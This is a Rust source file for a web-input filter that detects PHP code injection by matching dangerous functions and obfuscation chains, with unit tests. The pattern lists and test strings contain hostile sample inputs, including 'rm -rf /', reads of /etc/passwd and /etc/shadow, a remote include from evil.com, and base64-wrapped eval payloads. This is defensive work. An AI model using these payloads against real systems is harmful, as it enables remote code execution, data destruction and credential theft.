//! PHP Code Injection Guard.
//!
//! Detects attempts to inject PHP code via eval(), assert(), create_function(),
//! and obfuscation chains (base64_decode, str_rot13, gzinflate, chr()).
//!
//! Architecture: cheap Aho-Corasick filter first (~200ns). Only if suspicious
//! patterns are found does deeper analysis activate. In practice, the fast
//! filter eliminates 99%+ of legitimate inputs before any expensive work.

use aho_corasick::AhoCorasick;

use crate::Verdict;

/// Dangerous PHP function/construct patterns.
const CODE_PATTERNS: &[&str] = &[
    // Direct code execution
    "eval(",
    "assert(",
    "create_function(",
    "preg_replace(\"/", // /e modifier (deprecated but still dangerous)
    "call_user_func(",
    "call_user_func_array(",
    // System execution
    "exec(",
    "shell_exec(",
    "system(",
    "passthru(",
    "popen(",
    "proc_open(",
    "pcntl_exec(",
    "`", // backtick operator
    // Obfuscation chains
    "base64_decode(",
    "str_rot13(",
    "gzinflate(",
    "gzuncompress(",
    "gzdecode(",
    "str_replace(", // used in multi-layer deobfuscation
    "chr(",
    "pack(",
    // Nested eval
    "eval(eval(",
    "eval(base64_decode(",
    "eval(gzinflate(",
    "eval(str_rot13(",
    // File inclusion
    "include(",
    "include_once(",
    "require(",
    "require_once(",
    // Variable functions
    "$_GET[",
    "$_POST[",
    "$_REQUEST[",
    "$_COOKIE[",
    "$$", // variable variables
    // Reflection-based
    "ReflectionFunction",
    // Dynamic invocation patterns
    "->__construct(",
    "::__callStatic(",
];

/// Patterns that indicate multi-layer obfuscation (higher severity).
const OBFUSCATION_CHAINS: &[&str] = &[
    "base64_decode(base64_decode(",
    "eval(base64_decode(",
    "eval(gzinflate(base64_decode(",
    "assert(base64_decode(",
    "eval(str_rot13(",
    "preg_replace(\"/.*/e\"",
    "create_function(\"\"",
];

pub struct CodeGuard {
    /// Fast filter for basic patterns.
    basic_automaton: AhoCorasick,
    /// Deeper filter for obfuscation chains.
    obfuscation_automaton: AhoCorasick,
}

impl CodeGuard {
    pub fn new() -> Self {
        let basic_automaton = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(CODE_PATTERNS)
            .expect("Code patterns are valid");

        let obfuscation_automaton = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(OBFUSCATION_CHAINS)
            .expect("Obfuscation patterns are valid");

        CodeGuard {
            basic_automaton,
            obfuscation_automaton,
        }
    }

    /// Check a string for PHP code injection patterns.
    ///
    /// The cheap Aho-Corasick scan runs first. Obfuscation chain detection
    /// only activates if basic patterns match.
    pub fn check(&self, input: &str) -> Verdict {
        if input.is_empty() || input.len() < 4 {
            return Verdict::Allow;
        }

        // Phase 1: obfuscation chains (highest severity, block immediately)
        if let Some(mat) = self.obfuscation_automaton.find(input) {
            let idx = mat.pattern().as_usize();
            let pattern = OBFUSCATION_CHAINS.get(idx).unwrap_or(&"unknown");
            return Verdict::Block(format!("Code injection (obfuscation chain): {pattern}"));
        }

        // Phase 2: basic dangerous patterns
        if let Some(mat) = self.basic_automaton.find(input) {
            let idx = mat.pattern().as_usize();
            let pattern = CODE_PATTERNS.get(idx).unwrap_or(&"unknown");
            return Verdict::Block(format!("Code injection pattern: {pattern}"));
        }

        Verdict::Allow
    }
}

impl Default for CodeGuard {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allows_normal_input() {
        let guard = CodeGuard::new();
        assert_eq!(guard.check("hello world"), Verdict::Allow);
        assert_eq!(guard.check("user@example.com"), Verdict::Allow);
        assert_eq!(guard.check("12345"), Verdict::Allow);
        assert_eq!(guard.check(""), Verdict::Allow);
    }

    #[test]
    fn blocks_eval() {
        let guard = CodeGuard::new();
        assert!(guard.check("eval('malicious code')").is_blocked());
    }

    #[test]
    fn blocks_system_exec() {
        let guard = CodeGuard::new();
        assert!(guard.check("system('rm -rf /')").is_blocked());
        assert!(guard.check("exec('whoami')").is_blocked());
        assert!(guard.check("shell_exec('cat /etc/passwd')").is_blocked());
    }

    #[test]
    fn blocks_base64_obfuscation() {
        let guard = CodeGuard::new();
        assert!(guard
            .check("eval(base64_decode('bWFsaWNpb3Vz'))")
            .is_blocked());
    }

    #[test]
    fn blocks_nested_obfuscation() {
        let guard = CodeGuard::new();
        let input = "eval(gzinflate(base64_decode('eF4NyoEOgCAQBdC...')))";
        let v = guard.check(input);
        assert!(v.is_blocked());
        assert!(v.reason().unwrap().contains("obfuscation chain"));
    }

    #[test]
    fn blocks_superglobal_access() {
        let guard = CodeGuard::new();
        assert!(guard.check("$_GET['cmd']").is_blocked());
        assert!(guard.check("$_POST['data']").is_blocked());
    }

    #[test]
    fn blocks_backtick_operator() {
        let guard = CodeGuard::new();
        assert!(guard.check("`whoami`").is_blocked());
    }

    #[test]
    fn blocks_variable_variables() {
        let guard = CodeGuard::new();
        assert!(guard.check("$$var").is_blocked());
    }

    #[test]
    fn blocks_case_insensitive() {
        let guard = CodeGuard::new();
        assert!(guard.check("EVAL('code')").is_blocked());
        assert!(guard.check("System('cmd')").is_blocked());
    }

    // ─── Additional code-pattern coverage ────────────────────────────────────

    #[test]
    fn blocks_passthru() {
        let guard = CodeGuard::new();
        assert!(guard.check("passthru('cat /etc/shadow')").is_blocked());
    }

    #[test]
    fn blocks_popen() {
        let guard = CodeGuard::new();
        assert!(guard.check("popen('ls -la', 'r')").is_blocked());
    }

    #[test]
    fn blocks_proc_open() {
        let guard = CodeGuard::new();
        assert!(guard.check("proc_open('cmd', [], $pipes)").is_blocked());
    }

    #[test]
    fn blocks_pcntl_exec() {
        let guard = CodeGuard::new();
        assert!(guard
            .check("pcntl_exec('/bin/sh', ['-c', 'id'])")
            .is_blocked());
    }

    #[test]
    fn blocks_assert_injection() {
        let guard = CodeGuard::new();
        assert!(guard.check("assert('eval(chr(115))')").is_blocked());
    }

    #[test]
    fn blocks_include_injection() {
        let guard = CodeGuard::new();
        assert!(guard.check("include('/etc/passwd')").is_blocked());
        assert!(guard
            .check("include_once('/var/www/evil.php')")
            .is_blocked());
    }

    #[test]
    fn blocks_require_injection() {
        let guard = CodeGuard::new();
        assert!(guard.check("require('/tmp/shell.php')").is_blocked());
        assert!(guard
            .check("require_once('http://evil.com/code.php')")
            .is_blocked());
    }

    #[test]
    fn blocks_chr_function() {
        let guard = CodeGuard::new();
        // chr() used to build strings character by character to bypass filters
        assert!(guard
            .check("eval(chr(101).chr(118).chr(97).chr(108))")
            .is_blocked());
    }

    #[test]
    fn blocks_pack_function() {
        let guard = CodeGuard::new();
        assert!(guard
            .check("eval(pack('H*', '6d616c6963696f7573'))")
            .is_blocked());
    }

    #[test]
    fn blocks_gzuncompress() {
        let guard = CodeGuard::new();
        assert!(guard
            .check("eval(gzuncompress(base64_decode('...')))")
            .is_blocked());
    }

    #[test]
    fn blocks_gzdecode() {
        let guard = CodeGuard::new();
        assert!(guard
            .check("eval(gzdecode(base64_decode('...')))")
            .is_blocked());
    }

    #[test]
    fn blocks_str_replace_chain() {
        let guard = CodeGuard::new();
        // str_replace used to reconstruct forbidden function names
        assert!(guard
            .check("$f=str_replace('x','','xexvxaxl'); $f('code');")
            .is_blocked());
    }

    #[test]
    fn blocks_call_user_func() {
        let guard = CodeGuard::new();
        assert!(guard.check("call_user_func('system', 'id')").is_blocked());
        assert!(guard
            .check("call_user_func_array('exec', ['whoami'])")
            .is_blocked());
    }

    #[test]
    fn blocks_create_function() {
        let guard = CodeGuard::new();
        assert!(guard
            .check("create_function('','system(\"id\")')")
            .is_blocked());
    }

    #[test]
    fn blocks_reflection_function() {
        let guard = CodeGuard::new();
        assert!(guard
            .check("$rf = new ReflectionFunction('system');")
            .is_blocked());
    }

    #[test]
    fn blocks_preg_replace_e_flag() {
        let guard = CodeGuard::new();
        // preg_replace with /e modifier executes the replacement as PHP
        assert!(guard
            .check("preg_replace(\"/pattern/e\", $input, $str)")
            .is_blocked());
    }

    #[test]
    fn blocks_double_dollar_complex() {
        let guard = CodeGuard::new();
        // $$func() — call a function named in a variable
        assert!(guard.check("$$func()").is_blocked());
    }

    #[test]
    fn blocks_cookie_injection() {
        let guard = CodeGuard::new();
        assert!(guard.check("$_COOKIE['session']").is_blocked());
        assert!(guard.check("$_REQUEST['cmd']").is_blocked());
    }

    #[test]
    fn obfuscation_reason_contains_chain_label() {
        let guard = CodeGuard::new();
        let v = guard.check("eval(base64_decode('bWFsaWNpb3Vz'))");
        assert!(v.is_blocked());
        let reason = v.reason().expect("blocked must have reason");
        assert!(
            reason.contains("obfuscation chain"),
            "reason should mention 'obfuscation chain', got: {reason}"
        );
    }

    #[test]
    fn basic_pattern_reason_contains_pattern_name() {
        let guard = CodeGuard::new();
        let v = guard.check("system('whoami')");
        assert!(v.is_blocked());
        let reason = v.reason().expect("blocked must have reason");
        assert!(
            reason.contains("system("),
            "reason should name the matched pattern, got: {reason}"
        );
    }

    #[test]
    fn assert_base64_obfuscation_chain() {
        let guard = CodeGuard::new();
        let v = guard.check("assert(base64_decode('c3lzdGVtKCd3aG9hbWknKQ=='))");
        assert!(v.is_blocked());
        assert!(v.reason().unwrap().contains("obfuscation chain"));
    }

    #[test]
    fn construct_and_callstatic_blocked() {
        let guard = CodeGuard::new();
        assert!(guard.check("$obj->__construct('evil')").is_blocked());
        assert!(guard.check("Foo::__callStatic('cmd', ['id'])").is_blocked());
    }
}
